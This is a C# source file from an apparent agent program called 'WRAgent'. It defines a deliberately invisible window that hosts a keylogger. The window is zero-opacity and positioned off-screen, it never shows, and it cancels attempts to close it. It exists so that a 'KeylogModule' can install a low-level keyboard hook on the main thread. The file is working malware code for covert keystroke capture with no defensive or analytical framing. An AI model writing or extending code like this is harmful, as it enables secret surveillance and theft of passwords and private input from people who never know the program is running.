using System.Text;
using System.Windows.Forms;

namespace WRAgent
{
    /// <summary>
    /// Never-visible form. It exists purely to own a message pump on the
    /// main thread — the low-level keyboard hook needs one.
    /// </summary>
    internal sealed class HiddenForm : Form
    {
        public HiddenForm()
        {
            ShowInTaskbar = false;
            ShowIcon = false;
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Minimized;
            Opacity = 0;
            Text = BuildInfo.AgentTag;
            Size = new System.Drawing.Size(1, 1);
            StartPosition = FormStartPosition.Manual;
            Location = new System.Drawing.Point(-32000, -32000);

            // force handle + message queue creation before the hook goes in
            var _ = Handle;

            KeylogModule.Attach(this);
            KeylogModule.Install(this);
        }

        protected override void SetVisibleCore(bool value)
        {
            // hard block — this window is never shown
            base.SetVisibleCore(false);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
